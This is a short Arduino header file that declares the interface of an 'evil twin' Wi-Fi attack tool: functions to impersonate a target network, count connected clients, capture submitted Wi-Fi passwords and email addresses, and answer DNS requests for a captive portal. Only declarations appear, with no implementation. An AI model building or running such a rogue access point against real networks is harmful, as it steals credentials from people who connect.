#ifndef EVIL_TWIN_H
#define EVIL_TWIN_H

#include <Arduino.h>

void start_evil_twin(const char* target_ssid);
void stop_evil_twin();
bool is_et_running();
int get_et_client_count();
const char* get_et_captured();
void capture_credentials(const char* ssid, const char* password, const char* email);
void handleDNSRequest();

#endif